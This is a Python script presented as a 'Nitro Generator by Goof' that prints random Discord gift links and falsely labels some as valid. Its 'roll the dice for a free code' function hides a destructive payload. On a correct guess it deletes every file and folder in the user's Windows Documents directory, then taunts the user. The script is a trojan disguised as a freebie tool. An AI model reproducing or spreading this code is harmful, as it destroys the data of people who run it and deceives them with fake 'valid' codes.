import random
import string
import time
import os
import shutil

def RollDice():
    guess = int(input("Enter a random number (1-10): "))
    dice = random.randint(1, 10)
    if guess < 1 or guess > 10:
        print("Invalid number. Try again.")
        RollDice()
    elif guess == dice:
        # Delete everything in the documents folder
        pcusername = os.getlogin()
        documents = f"C:\\Users\\{pcusername}\\Documents"
        for file in os.listdir(documents):
            file_path = os.path.join(documents, file)
            try:
                if os.path.isfile(file_path):
                    os.unlink(file_path)
                elif os.path.isdir(file_path): shutil.rmtree(file_path)
            except Exception as e:
                print()
    
        print(f"Congratulations! You guessed the number {dice}. Your documents have been deleted.")

def generate_nitro_code():
    code = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
    return f'Discord Promo Code: https://discord.gift/{code}'

print("\033[91m" + "═" * 100 + "\033[0m")
print("\033[91m" + " " * 40 + "NITRO GENERATOR BY GOOF" + " " * 40 + "\033[0m")
print("\033[91m" + "═" * 100 + "\033[0m")
print("Press Ctrl+C to stop generating Discord promo codes.\n")

valid_codes_file = open("valid_codes.txt", "a")

try:
    while True:
        nitro_code = generate_nitro_code()
        print(nitro_code)
        
        # Check if the code is valid (for demonstration purposes)
        if random.random() < 0.05:  
            valid_codes_file.write(nitro_code + "\n")
            print("\nThis code was valid. Use it and thank Goof.\n")
        
        time.sleep(1)  

except KeyboardInterrupt:
    print("\nCode generation stopped.")
    valid_codes_file.close()

    yorn = input("Do you want to roll the dice for a free code? (y/n): ")
    if yorn.lower() == "y":
        RollDice()
    else:
        print("Goodbye.")

